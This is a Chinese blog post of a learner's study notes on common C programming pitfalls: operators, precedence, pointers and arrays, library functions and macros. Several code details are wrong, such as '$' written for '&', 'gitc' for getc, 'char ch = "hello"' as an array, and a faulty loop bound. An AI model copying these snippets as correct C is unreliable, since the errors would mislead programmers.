<h2 id="1-词法陷阱"><a href="#1-词法陷阱" class="headerlink" title="1|词法陷阱"></a>1|词法陷阱</h2><p>第一章，将程序代码看成是有符号构成的字符序列，把自己想象成是c语言的“词法分析器”，看看相同的字符序列，在不同的上下文环境中，会发生那些有意思的事情。</p>
<h3 id="不同于"><a href="#不同于" class="headerlink" title="=不同于=="></a>=不同于==</h3><p>在c语言中，符号=作为赋值运算，符号==作为比较。由于这两个符号很相似，稍不留神就会犯错误，少一个 = 或者多一个 = ，都会造成错误。</p>
<p>当我们本意是作比较运算时，却无意中多敲了一个 = 号时，就发生了错误。比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if(x = y) </div><div class="line">	break;</div></pre></td></tr></table></figure>
<p>本意是比较x与y,相等就break。而实际上是将y赋值给了x,然后检查该值是否为零，也就是y的值作为了判断的条件，不再是 x是否等于y为判断条件了。</p>
<p>需要注意的是，如果我们确实需要对变量进行赋值并检查该变量的新值是否为0时，请加括号。比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if(x=y) </div><div class="line">	foo();</div><div class="line"></div><div class="line">请写成：</div><div class="line">if((x=y) != 0) </div><div class="line">	foo();</div></pre></td></tr></table></figure></p>
<p>这样的好处是程序的可读性强，同时避免犯错误。</p>
<p>当然，把比较赋值运算误写成比较运算，也会造成错误。比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if((filedesc == open(argv[1],0)) &lt; 0)</div><div class="line">   error();</div></pre></td></tr></table></figure>
<p>本意是将函数open（）的返回值赋值给 filedesc ，然后比较filedesc 与 1 的值，判断函数是否执行成功。但现在变成了比较函数open()的返回值与变量filedesc，然后检查比较的结果是否小于0。实际的意思与本意有了很大的区别。</p>
<h3 id="和-不同于-和"><a href="#和-不同于-和" class="headerlink" title="$和|不同于$$和||"></a>$和|不同于$$和||</h3><p>这几个符号也是容易混淆的，要时刻记住 $和| 是算术符号，其作用是按位进行运算；$$和||是逻辑运算，其结果只能是 1 或 0 。</p>
<h3 id="词法分析中的“贪心发”"><a href="#词法分析中的“贪心发”" class="headerlink" title="词法分析中的“贪心发”"></a>词法分析中的“贪心发”</h3><p>c语言编译器理解构成程序的字符序列时，采取贪心规则：每一个符号应该包含尽可能多的字符。同时，需要注意，除了字符串与字符常量，符号的中间不能有空白（空格符、制表符、换行符）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">a---b</div><div class="line">与表达式</div><div class="line">a -- - b </div><div class="line">的含义相同，而与</div><div class="line">a - -- b</div><div class="line">的含义不同</div></pre></td></tr></table></figure>
<p>还有要注意c语言中的注释符号 /* 。比如：</p>
<p><code>y = x/*p</code></p>
<p>本意是用x除以p指向的值，把所得的商赋值给 y ，但现在编译器将/<em> 匹配在了一起，理解成注释符号了，原意改变了。我们应该这样写：<br>`y = x/(</em>p)`</p>
<p>总的来说，要尽可能避免因编译器的“贪心法”匹配规则，把我们的程序理解成另一种意思。</p>
<h3 id="整数常量"><a href="#整数常量" class="headerlink" title="整数常量"></a>整数常量</h3><p>这主要讲的是编译器会把第一个字符是数字0的常量视为8进制数，而改变了我们原本像表示的意思。</p>
<h3 id="字符与字符串"><a href="#字符与字符串" class="headerlink" title="字符与字符串"></a>字符与字符串</h3><p>c语言中单引号与双引号的含义是不同的，这也是我们常犯的错误。用单引号引起的是一个字符，实际上表示的是一个整数；用双引号引起的是字符串，代表的是一个指向无名数组起始字符的指针，该指针被双引号之间的字符以及一个额外的二进制值为0的字符’\0’初始化。</p>
<p><strong>第一章“词法陷阱”，从编译器的角度，一些相同的字符序列，可能会因编译器的识别规则，从而有不同的意思；还有就是混淆一些相似的符号的用法，造成错误。</strong></p>
<h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><p><strong>1.3</strong> 对于n–&gt;0,编译器根据贪心准则，会首先匹配a–,然后尝试 a–&gt;,这个不是合法的，就从 &gt; 开始匹配； &gt;0,不是合法的，所以最后的结果是 (a–)&gt;0。</p>
<p><strong>1.4</strong> 这个题最初的想法是((a++)++)+b ;又想到了另一种 (a++)+(++b);不过，放到编译器中时，不能编译通过。不过当写成 <code>a++ + ++b</code>是能编译通过，所以猜想意思是(a++)+(++b)。</p>
<h2 id="2-词法陷阱"><a href="#2-词法陷阱" class="headerlink" title="2|词法陷阱"></a>2|词法陷阱</h2><h3 id="理解函数声明"><a href="#理解函数声明" class="headerlink" title="理解函数声明"></a>理解函数声明</h3><h3 id="运算符的优先级问题"><a href="#运算符的优先级问题" class="headerlink" title="运算符的优先级问题"></a>运算符的优先级问题</h3><p>C语言中有许多运算符，有逻辑运算符、算术运算符、移位运算符…不同的运算符的优先级是不一样的。</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>结合性</th>
</tr>
</thead>
<tbody>
<tr>
<td>()  []  -&gt; .</td>
<td>自左向右</td>
</tr>
<tr>
<td>!  ~ ++ – - (type) * &amp; sizeof</td>
<td>自右向左</td>
</tr>
<tr>
<td>*  / %</td>
<td>自左向右</td>
</tr>
<tr>
<td>+  -</td>
<td>自左向右</td>
</tr>
<tr>
<td>&lt;&lt;   &gt;&gt;</td>
<td>自左向右</td>
</tr>
<tr>
<td>&lt;  &lt;=  &gt;  &gt;=</td>
<td>自左向右</td>
</tr>
<tr>
<td>==  !=</td>
<td>自左向右</td>
</tr>
<tr>
<td>&amp;</td>
<td>自左向右</td>
</tr>
<tr>
<td>^</td>
<td>自左向右</td>
</tr>
<tr>
<td>(按位或)</td>
<td>自左向右</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>自左向右</td>
</tr>
<tr>
<td>或</td>
<td>自左向右</td>
</tr>
<tr>
<td>?：</td>
<td>自右向左</td>
</tr>
<tr>
<td>assignments</td>
<td>自右向左</td>
</tr>
<tr>
<td>,</td>
<td>自左向右</td>
</tr>
</tbody>
</table>
<p>如果不注意运算符的优先级，很可能会出现这样的错误：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">while(c = gitc(in) != EOF)</div><div class="line">	putc(c,out);</div></pre></td></tr></table></figure>
<p>例子本意是复制一个文件到另一个文件。在上述代码中，c似乎是先被赋予getc(in)的值，然后与EOF比较是否达到文件末尾。然而，由于赋值运算符的优先级小于比较运算符，所以实际表达的意思是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">while(c = (gitc(in) != EOF))</div><div class="line">	putc(c,out);</div></pre></td></tr></table></figure></p>
<p>与原意大相径庭了。</p>
<p>此外，还要注意运算符的结合性。如果p是指向一个函数的指针，要调用p所指向的函数，就必须要这样写：<code>(*p)()</code>。因为如果写成<code>*p()</code>，编译器会理解成 <code>*(p())</code>。在比如在单目运算符中，<code>*p++</code>会被编译成<code>*(p++)</code>,即取指针p所指向的对象，然后将p递增1，不是<code>(*p)++</code>的意思了。</p>
<h3 id="注意作为语句结束标志的分号"><a href="#注意作为语句结束标志的分号" class="headerlink" title="注意作为语句结束标志的分号"></a>注意作为语句结束标志的分号</h3><h4 id="多了一个分号"><a href="#多了一个分号" class="headerlink" title="多了一个分号"></a>多了一个分号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if(x[i] &gt; big);</div><div class="line">	big = x[i];</div><div class="line">    </div><div class="line">big = x[i]跟if就没有关系了，也就相当于：</div><div class="line">if(x[i] &gt; big) &#123;&#125;</div><div class="line">	big = x[i];</div></pre></td></tr></table></figure>
<h4 id="少了一个分号"><a href="#少了一个分号" class="headerlink" title="少了一个分号"></a>少了一个分号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">if(n&lt;3)</div><div class="line">	return</div><div class="line">str.date = a;</div><div class="line">str.date = b;</div><div class="line">str.date = c;</div><div class="line"></div><div class="line">这个就相当于:</div><div class="line"></div><div class="line">if(n&lt;3)</div><div class="line">	return str.date = a;</div><div class="line">str.date = b;</div><div class="line">str.date = c;</div></pre></td></tr></table></figure>
<p>缺少分号，编译器可能会发出警告的信息，但如果缺分号并不造成语法上的错误，编译器不会发出错误信息，同时，这样的bug极其不容易被发现，要注意这类bug。</p>
<h3 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h3><p>在switch中，要注意break的使用。c语言中，如果不显示写出break，程序会依次往下执行；如果真的是keyi刻意不写break，也应该注释一下，提高代码的可读性。</p>
<h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>C语言中，无论函数需要参数与否，都需要加上()，不然编译器不会认为这是函数调用。</p>
<h3 id="“悬挂”else引发的问题"><a href="#“悬挂”else引发的问题" class="headerlink" title="“悬挂”else引发的问题"></a>“悬挂”else引发的问题</h3><p>这也是容易发生的bug,比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if( x == 0)</div><div class="line">	if( y == 0) error();</div><div class="line">else&#123;</div><div class="line">	z = x + y;</div><div class="line">    f(z);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>本意上，else是与第一个if配对的，但现在实际的意思是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">if( x == 0)&#123;</div><div class="line">	if( y == 0) error();</div><div class="line">    else&#123;</div><div class="line">        z = x + y;</div><div class="line">        f(z);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>与原来的意思相差十万八千里。</p>
<h2 id="3-词义“陷阱”"><a href="#3-词义“陷阱”" class="headerlink" title="3|词义“陷阱”"></a>3|词义“陷阱”</h2><h3 id="指针与数组"><a href="#指针与数组" class="headerlink" title="指针与数组"></a>指针与数组</h3><p>关于c语言，需要注意的是：</p>
<ul>
<li>C语言中只有一维数组，数组大小在编译期就要明确。同时，数组的元素可以是任意类型的对象，可以是整数、结构体…任意的对象自然也还包括数组，所以就能根据这个“仿真”出多维数组。</li>
<li>对于数组，我们只能做两件事：<ul>
<li>确定大小</li>
<li>获得指向数组下标为0的指针</li>
</ul>
</li>
</ul>
<p>所以，我们知道我们对数组的操作，都是在通过操作指向数组下标为0的指针进行的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">int a[3];</div><div class="line">int * p = a;</div><div class="line">print(&quot;%d&quot;,*p);</div></pre></td></tr></table></figure>
<p>上述例子会打印出 a[0] 的值，所以我们得知 <strong>数组名就是指向数组下标为0的元素的指针</strong>。在进一步，对于<code>p+1</code>，我们得到了数组下标为1的指针。总的来说，<code>*(a+i)</code>就是数组中下标为i的元素的引用。</p>
<p>那么在二维数组中，数组名指的是什么呢？前面的讨论中得知，二维数组就是以数组为元素的一维数组。看个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">int calendar [12][31];</div><div class="line">int *p;</div><div class="line">int i;</div></pre></td></tr></table></figure>
<p>calendar是一个有着12个数组类型元素的数组，它的每个数组类型元素又是一个有着31个整形元素的数组，所以<code>calendar[4]</code>是calendar数组的第五个元素，是calendar数组中12个有着31个整形元素的数组之一。</p>
<p>对于语句 <code>i =calendar[4][7]</code> 可以这样表达 <code>i=*(calendar[4]+7)</code>;那语句 <code>p = calendar</code>是什么意思呢？是正确的吗？</p>
<p><strong> <code>p = calendar</code>是非法的，因为calendar是二维数组，也就是“数组的数组”，calendar是数组名，是指向数组下标为0的元素的指针，那也就是说 calendar是指向一个数组的指针，但 p 是指向一个整形的指针。该语句试图将一种类型的指针赋值给另一种类型的指针，所以是非法的。</strong></p>
<p>所以可以这样写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">int calendar[12][31];</div><div class="line">int (*p)[31];</div><div class="line">p = calendar;</div></pre></td></tr></table></figure>
<p>一种根据指针的方式来操作数组：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">int calendar[12][31];</div><div class="line">int (*p)[31];</div><div class="line"></div><div class="line">for(p = calendar;p &lt; &amp;calendar[12];p++)&#123;</div><div class="line">	int *t;</div><div class="line">    for(t = *p;t&lt;&amp;(*p);t++)</div><div class="line">    	*t = 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><strong>对于指针，还有一点需要注意：如果ip指向一个整数，那么 <code>ip+1</code> 指向的是计算机内存中的下一个整数，在大多数现代计算机中，它都不同于ip所指向地址的下一个内存位置。</strong>对于数组，它的元素在内存中是连续的，所以<code>*(a+i)</code>就是数组中下标为i的元素的引用。</p>
<h3 id="非指针的数组"><a href="#非指针的数组" class="headerlink" title="非指针的数组"></a>非指针的数组</h3><p>这里主要讲的是字符串常量。在C语言中，字符串常量代表了一块包括字符串中所有字符以及一个空字符(‘\0)的内存区域的地址。所以字符串“hello”，在内存中的是以这样“hello\0”的状态存在的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">char ch = &quot;hello&quot;;</div></pre></td></tr></table></figure>
<p>对呀数组ch,它的元素个数是6。</p>
<h3 id="作为参数的数组声明"><a href="#作为参数的数组声明" class="headerlink" title="作为参数的数组声明"></a>作为参数的数组声明</h3><p>在这一节中，最主要讲的就是：如果我们使用数组名作为参数，那么实际上我们传的参数是指向该数组的第一个元素的指针。比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">char hello[] = &quot;hello&quot;;</div><div class="line">printf(&quot;%s\n&quot;,hello);</div><div class="line">printf(&quot;%s\n&quot;,&amp;hello[0]);</div></pre></td></tr></table></figure>
<p>上述的两条打印语句是等效的。</p>
<h3 id="避免“举偶法”"><a href="#避免“举偶法”" class="headerlink" title="避免“举偶法”"></a>避免“举偶法”</h3><p>这一节中，主要思想就是：改变指针的值，不会改变指针所指向的内容。比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">char *p = &quot;hello&apos;;</div><div class="line">char *q = &quot;Hello world&quot;;</div></pre></td></tr></table></figure>
<p>如果此时执行 <code>p = q</code>,这个语句并没有同时复制内存中的字符，也就是说原来的 p 指向的内存单元中存储的还是”hello”这个字符串。</p>
<h3 id="边界计算与不对称边界"><a href="#边界计算与不对称边界" class="headerlink" title="边界计算与不对称边界"></a>边界计算与不对称边界</h3><p>看一段代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">int i,a[10];</div><div class="line"></div><div class="line">for(i=0;i&lt;=9;i++)</div><div class="line">	a[i] = 0;</div><div class="line">    </div><div class="line">for(i=0;i&lt;10;i++)</div><div class="line">	a[i] = 0;</div></pre></td></tr></table></figure>
<p>上面的两个循环都是初始化数组为0，但是那种写法好呢？</p>
<p>先不着急回答上面的问题。如果我们想要求数组 a 中的元素个数，第一种写法我们的求法是 <code>9-0+1</code>，第二种写法的求法是 <code>10-0</code>。请问下，那种解法更容易出错呢？个人认为是第一种，因为加 1 的操作可能会被我们忘记。</p>
<p>所以我们更加推荐第二种不对称的写法。<strong>用第一个入界点和第一个出界点来表示一个数值范围。注意，入界点是在范围内的，但出界点是不在范围内的。</strong>拿队列来说吧，队列的头所在的位置是空的，是出界点，队列的尾的位置是有元素的，是入界点，所以计算队列中的元素个数，就用 end-start，就不用+1的操作了。</p>
<p>这种思想在程序设计中有诸多优点：</p>
<ul>
<li>取值范围的大小就是上界下界之差。</li>
<li>如果取值范围为空，那么上界等于下界。</li>
<li>即使取值范围为空，上界也不可能小于下界。</li>
</ul>
<h3 id="求值顺序"><a href="#求值顺序" class="headerlink" title="求值顺序"></a>求值顺序</h3><p>求值顺序和运算符优先级是两个不同的东西。运算符优先级是保证 <code>a+b*c</code>被解释成 <code>a+(b*c)</code>的这样一类规则。求值规则是另一种规则，可以保证像下面的语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if(count!=0 &amp;&amp; sum/count &lt; smallaverage)</div><div class="line">	printf(&quot;hello,world&quot;);</div></pre></td></tr></table></figure>
<p>即使当变量count为0时，也不会产生一个“用0做除数”的错误。也就是说，求值顺序保证先求 <code>count != 0</code>的值，且只用其值为1，才继续求值。</p>
<p>C语言中只用四个运算符（&amp;&amp;、||、?: 和 ，）存在规定的求值范围,其他所有的运算符对其操作数求值的顺序是未定义的，所以如下语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">i = 0;</div><div class="line">while(i&lt;n)</div><div class="line">	y[i] = x[i++];</div></pre></td></tr></table></figure>
<p>是存在风险的。因为上述代码如果要正确运行，需要保证 <code>i++</code> 在 <code>y[i] = x[i]</code>之后运行，但这是无法保证的。所以推荐写法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">i = 0;</div><div class="line">while(i&lt;n)&#123;</div><div class="line">	y[i] = x[i];</div><div class="line">    i++;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="为函数main提供返回值"><a href="#为函数main提供返回值" class="headerlink" title="为函数main提供返回值"></a>为函数main提供返回值</h3><p>如果不为main函数显示声明返回类型，那么就会默认为整型。虽然某些情况下函数main的返回值无关紧要，但是大多数C语言实现都通过这个返回值来告知系统该函数执行成功或者失败。</p>
<h2 id="5-库函数"><a href="#5-库函数" class="headerlink" title="5|库函数"></a>5|库函数</h2><p>这一章介绍一些使用过程中经常会犯错的库函数。</p>
<h3 id="返回整数的getchar函数"><a href="#返回整数的getchar函数" class="headerlink" title="返回整数的getchar函数"></a>返回整数的getchar函数</h3><p>先看个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line"></div><div class="line">main()&#123;</div><div class="line">	char c;</div><div class="line">    while((c=getchar()) != EOF)</div><div class="line">    	putchar(c);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个例子本意是把标准输入复制到标准输出，但是有潜在的bug。原因是变量 c 是 char 类型的，只占一个字节，但是getchar函数返回的是int 整数，也就是说c无法容下所有可能的字符，那么如果EOF不在c所能容下的字符之中，就陷入了死循环了。</p>
<h3 id="更新顺序文件"><a href="#更新顺序文件" class="headerlink" title="更新顺序文件"></a>更新顺序文件</h3><p>这一小节讲文件的操作。在C语言中，在对文件操作是，<strong>需要注意一个输入操作不能随后直接紧跟一个输出操作，反之亦然。</strong>如果要同时进行输入输出操作，必须在其中插入 fseek() 函数。</p>
<blockquote>
<p>int fseek(FILE <em>stream, long offset, int fromwhere);函数设置文件指针stream的位置。如果执行成功，stream将指向以fromwhere为基准，偏移offset（指针偏移量）个字节的位置，函数返回0。如果执行失败(比如offset取值大于等于2</em>1024<em>1024</em>1024，即long的正数范围2G)，则不改变stream指向的位置，函数返回一个非0值。</p>
</blockquote>
<h3 id="缓冲输出与内存分配"><a href="#缓冲输出与内存分配" class="headerlink" title="缓冲输出与内存分配"></a>缓冲输出与内存分配</h3><p>程序有两种输出方式：</p>
<ul>
<li>即时处理 [相应快，但系统负担较高]</li>
<li>先暂存起来，然后大块写入  [相应慢，但减少io交互]</li>
</ul>
<p>两种各有各的优缺点，需要根据实际情况进行选择。</p>
<p>缓存可以通过库函数 <code>setbuf</code>实现。如果buf是一个大小适合的字符数组，那么 <code>setbuf(stdout,buf)</code>语句将通知输入/输出库，所有写到stdout的输出都应该使用buf作为输出缓冲区，直到buf缓冲区被填满或者程序员直接调用 ·fflush`,buf缓冲区中的内容才实际写入到stdout中。<strong>那么问题来了，如果在程序退出时，缓冲区没满，我们又没有调用fflush，会出现什么问题呢？</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">int main()&#123;</div><div class="line">    int c;</div><div class="line">    char buf[BUFSIZ];   //BUFSIZE缓冲区的大小在stdio.h有定义</div><div class="line">    setbuf(stdout,buf); //所有写入到stdout的输出都应该使用buf作为输出缓冲区，直到buf缓冲区被填                                  //满或者程序员直接调用fflush</div><div class="line">    while((c=getchar())!=EOF)</div><div class="line">        putchar(c);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在这个例子中，有潜在的bug。如果在程序退出的时候，buf缓冲区没有被填满，buf缓冲中的数据将不会被写入stdout中。</p>
<p>要避免类似的错误，有两种方法：</p>
<ul>
<li>让缓冲数组成为静态数组</li>
<li>动态分配缓冲区</li>
</ul>
<h3 id="使用errno检测错误"><a href="#使用errno检测错误" class="headerlink" title="使用errno检测错误"></a>使用errno检测错误</h3><p>很多库函数在执行失败时会通过一个名称为errno的外部变量通知程序该函数调用失败。但是不能利用errno判断函数是否调用失败。如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/*调用库函数*/</div><div class="line">if(errno)</div><div class="line">      /*处理错误*/</div></pre></td></tr></table></figure></p>
<p>但这样是错误的，因为在库函数调用没有失败的情况下，并没有强制要求库函数一定要设置errno为0，这样errno的值就可能是前一个执行失败的库函数设置的值。</p>
<p>所以有人可能会想下面的例子是对的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">errno  = 0</div><div class="line">/*调用库函数*/</div><div class="line">if(errno)</div><div class="line">      /*处理错误*/</div></pre></td></tr></table></figure>
<p>很遗憾，这也是错的，因为库函数调用成功是，既没有强制要求对errno清零，但同时也没有禁止 设置errno。<strong>哪为什么调用成功了还有设置errno呢？</strong>因为库函数可能会调用其他的库函数，在调用其他的库函数过程中可能会出错从而设置errno。比如fopen，fopen函数调用过程中可能需要调用其他的库函数，以检测同名文件是否存在。</p>
<p>所以，在调用库函数时，应首先检测作为错误指示的返回值，确定程序执行已经失败，然后再检查errno，来搞清楚出错原因：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/* 调用库函数 */</div><div class="line">if(返回的错误值)</div><div class="line">        检查errno</div></pre></td></tr></table></figure></p>
<h3 id="库函数signal"><a href="#库函数signal" class="headerlink" title="库函数signal"></a>库函数signal</h3><p>signal库函数可作为捕获异步事件的一种方式。源文件：#include<signal.h></signal.h></p>
<p>signal(signal type,handler funtion)signal type代表系统头文件signal.h中定义的某些常量，这些常量用来标识signal加密手机将要捕获的信号类型。handler funtion 是当指定的时间发生时，将要加以调用的事件处理函数。</p>
<p>一个信号可能在C程序执行期间的任何时刻上发生，信号甚至可能出现在某些负责库函数（如malloc）的过程中。因此，信号的处理函数不应该调用上述类型的库函数。</p>
<p>当一个算术运算错误（例如溢出或者零作除数）引发一个信号时，signal处理函数的唯一安全、可移植的操作是打印一条出错消息，然后使用longjmp或exit立即退出程序。</p>
<h2 id="6-预处理器"><a href="#6-预处理器" class="headerlink" title="6|预处理器"></a>6|预处理器</h2><p><strong>宏只是对程序的文本起作用</strong>。宏提供了一种对组成C语言程序的字符进行变换的方式，并没有作用于程序中的对象。宏是一把双刃剑。</p>
<h3 id="不能忽视宏定义中的空格"><a href="#不能忽视宏定义中的空格" class="headerlink" title="不能忽视宏定义中的空格"></a>不能忽视宏定义中的空格</h3><p>在定义宏的时候，要注意空格，比如：</p>
<p><code>#define f (x)  ((x)-1)</code></p>
<p>上面的宏定义有两种解释方法：</p>
<ul>
<li>f(x) 代表 ((x)-1)</li>
<li>f 代表 x ((x)-1)</li>
</ul>
<p>虽然我们的本意是第一种，但是很遗憾，实际上是第二种，因为我们在定义宏的时候，f与(x) 之间多了个空格!!所以正确写法 <code>#define f(x)  ((x)-1)</code></p>
<h3 id="宏不是函数"><a href="#宏不是函数" class="headerlink" title="宏不是函数"></a>宏不是函数</h3><p>虽然宏定义表面上与函数非常类似，但是宏定义不是函数，<strong>宏只是对程序的文本起作用</strong>。我们经常看到这样的写法:<code>#define abs(x) (((x)&gt;=0)?(x):-(x))</code>或者<code>#define max(a,b) ((a)&gt;(b)?(a):(b))</code>。很多人会不解为什么要用这么多括号，不要小看这些括号，它们额的作用是预防引起优先级有关的问题。</p>
<p>但是当遇到递增运算时，括号也不怎么管用了。因为如果一个操作数被两处用到，就会被求值两处。看个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">biggest = x[0];</div><div class="line">i = 1;</div><div class="line">while(i &lt; n)&#123;</div><div class="line">	biggest = max(biggest,x[i++]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当代码中的max是我们刚定义的宏时，就出现了一些意想不到的事情。假设：</p>
<pre><code>x[0] = 2;
x[1] = 3;
x[2] = 1;
</code></pre><p>当我们把宏定义展开时，是这样的：<code>biggest = ((biggest)&gt;(x[i++])?(biggest):(x[i++]));</code>。在这个代码中，biggest将与x[i++] 比较，i此时为1，x[1]为3，biggest为2，比较结果为false。为i++,比较后 i = 2。比较结果为false,所以x[i++]的值讲被赋给biggest,但是在比较的时候，i已经变成了2，所以biggest的值为1。这时，又因为i++,i的值变为了3。不可思议吧。</p>
<p>但是，如果这里的max是个函数的话，是不会有什么问题的。</p>
<p>还应该注意，<strong>宏展开可能产生非常庞大的表达式，占用的空间远远超过了编程者所期望的空间</strong>。</p>
<h3 id="宏不是语句"><a href="#宏不是语句" class="headerlink" title="宏不是语句"></a>宏不是语句</h3><p>主要理解两点：</p>
<ul>
<li>夸张的说我们可以用宏把一门语言变成另外一门语言，但是问题会很多，比如说：导致替换后的分号有时候要加有时候不用加，大括号的匹配出现问题，else的匹配出现问题</li>
<li>一个小技巧能避免上述的问题：<code>#define deal(x) (表达式一||表达式二)</code>这样可以让if判断语句通过 || 或者 &amp;&amp; 来简化操作，并且不用但是大括号和else的匹配问题</li>
</ul>
<h3 id="宏并不是类型定义"><a href="#宏并不是类型定义" class="headerlink" title="宏并不是类型定义"></a>宏并不是类型定义</h3><p>看个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#define T1 struct foo *</div><div class="line">typedef struct foo *T2</div></pre></td></tr></table></figure>
<p>可以看出T1，T2概念上完全相同，都是指向结构foo的指针，如果用它们来定义多个变量时，问题就来了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">T1 a,b;</div><div class="line">T2 a,b;</div></pre></td></tr></table></figure>
<p>对宏定义的T1来说，是这样的 <code>struct foo * a,b;</code>,a,b是不同类型的变量，对T2来说，a，b是一样的。所以还是要区分宏与类型定义的不同。</p>
<h2 id="7-可移植性缺陷"><a href="#7-可移植性缺陷" class="headerlink" title="7|可移植性缺陷"></a>7|可移植性缺陷</h2><p>不同同的C语言实现都会尽量适应ANSI C标准，但还是会有一些微小差别，如果希望一个c程序在另一个编译环境中也能运行，必须掌握很多细小的差别。</p>
<h3 id="应对C语言标准变更"><a href="#应对C语言标准变更" class="headerlink" title="应对C语言标准变更"></a>应对C语言标准变更</h3><p>语言标准的变更，如果使用它们，程序更容易编写且不易出错，但是代价也大，就是这些程序无法再较早的编译器上工作。需要在使用与不适用之间做出权衡。</p>
